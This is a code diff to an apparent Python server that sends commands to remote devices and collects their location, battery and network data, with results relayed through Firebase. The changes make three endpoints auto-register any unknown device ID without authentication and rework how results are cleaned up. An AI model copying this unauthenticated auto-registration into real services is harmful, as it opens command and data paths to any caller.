@@ -1714,10 +1714,30 @@ async def api_get_commands(request):
     if not device_id:
         return web.json_response({"ok": False, "error": "device_id required"}, status=400)
     
-    # Verify device
+    # Auto-register device if not found (app may have linked via Firebase only)
     d = find_device(device_id)
     if not d:
-        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+        # Auto-register with minimal info
+        from datetime import datetime as _dt
+        device_data = {
+            "id": device_id,
+            "token": secrets.token_urlsafe(32),
+            "active": True,
+            "name": device_id,
+            "model": "",
+            "brand": "",
+            "os": "",
+            "battery": "",
+            "network": "",
+            "location": "",
+            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "auto_registered": True,
+        }
+        add_device(device_data)
+        d = device_data
+        log.info("Auto-registered device: %s", device_id)
+        append_event("Device auto-registered", {"id": device_id})
     
     pending = get_pending_commands(device_id)
     
@@ -1808,7 +1828,10 @@ async def api_device_data(request):
         
         d = find_device(device_id)
         if not d:
-            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+            device_data = {"id": device_id, "token": secrets.token_urlsafe(32), "active": True, "name": device_id, "model": "", "brand": "", "os": "", "battery": "", "network": "", "location": "", "last_seen": ts(), "created_at": ts(), "auto_registered": True}
+            add_device(device_data)
+            d = device_data
+            log.info("Auto-registered device (data-path): %s", device_id)
         
         dev_name = d.get("name", device_id)
         update_device(device_id, {"active": True})
@@ -1881,7 +1904,10 @@ async def api_device_data_body(request):
         
         d = find_device(device_id)
         if not d:
-            return web.json_response({"ok": False, "success": False, "error": "Device not found"}, status=404)
+            device_data = {"id": device_id, "token": secrets.token_urlsafe(32), "active": True, "name": device_id, "model": "", "brand": "", "os": "", "battery": "", "network": "", "location": "", "last_seen": ts(), "created_at": ts(), "auto_registered": True}
+            add_device(device_data)
+            d = device_data
+            log.info("Auto-registered device (data-body): %s", device_id)
         
         update_device(device_id, {"active": True})
         append_event(f"Data received: {command}", {"device_id": device_id})
@@ -2656,11 +2682,30 @@ async def firebase_result_listener():
     global _processed_results
     log.info("Firebase result listener started (passive mode)")
 
-    # Clean all pending results on startup
+    # Only clean OLD results (older than 5 minutes) on startup
+    # Do NOT clean commands - they must reach the device!
     try:
-        log.info("Cleaning pending Firebase results on startup...")
-        await firebase_set("results", None)
-        log.info("Firebase results cleanup done")
+        log.info("Checking stale Firebase results on startup...")
+        stale_results = await firebase_get("results")
+        if stale_results and isinstance(stale_results, dict):
+            import time as _time
+            now_ts = _time.time() * 1000  # Firebase timestamps are in ms
+            for device_id, cmds in stale_results.items():
+                if not isinstance(cmds, dict):
+                    continue
+                for cmd_id, result_entry in cmds.items():
+                    if not isinstance(result_entry, dict):
+                        continue
+                    ts_val = result_entry.get("timestamp", 0)
+                    if isinstance(ts_val, str):
+                        try:
+                            ts_val = float(ts_val)
+                        except:
+                            ts_val = 0
+                    if ts_val and now_ts - ts_val > 300000:  # older than 5 minutes
+                        await firebase_set(f"results/{device_id}/{cmd_id}", None)
+                        log.info("Cleaned stale result: %s/%s", device_id, cmd_id)
+        log.info("Stale results cleanup done")
     except Exception as exc:
         log.error("Firebase cleanup error: %s", exc)
 
@@ -2688,15 +2733,22 @@ async def firebase_result_listener():
                     result_key = f"{device_id}:{cmd_id}:{content_hash}"
 
                     if result_key in _processed_results:
-                        await firebase_set(f"results/{device_id}/{cmd_id}", None)
+                        # Already processed, skip (don't delete - it may have been deleted already)
                         continue
 
                     status = result_entry.get("status", "completed")
                     command = result_entry.get("command", "")
 
+                    # Update local command status (do NOT delete from Firebase yet)
                     update_command_status(cmd_id, status, result_text)
                     update_device(device_id, {"active": True})
-                    await firebase_set(f"results/{device_id}/{cmd_id}", None)
+
+                    # Delete the result from Firebase after processing
+                    # Use a short delay to avoid race conditions
+                    try:
+                        await firebase_set(f"results/{device_id}/{cmd_id}", None)
+                    except:
+                        pass
 
                     _processed_results.add(result_key)
                     processed_any = True
@@ -2705,11 +2757,8 @@ async def firebase_result_listener():
             if len(_processed_results) > 1000:
                 _processed_results = set(list(_processed_results)[-300:])
 
-            if processed_any:
-                try:
-                    await firebase_set("results", None)
-                except:
-                    pass
+            # Do NOT do full cleanup - only individual results were cleaned above
+            # This prevents accidentally deleting results the app just wrote
 
         except Exception as exc:
             log.error("Firebase listener error: %s", exc)
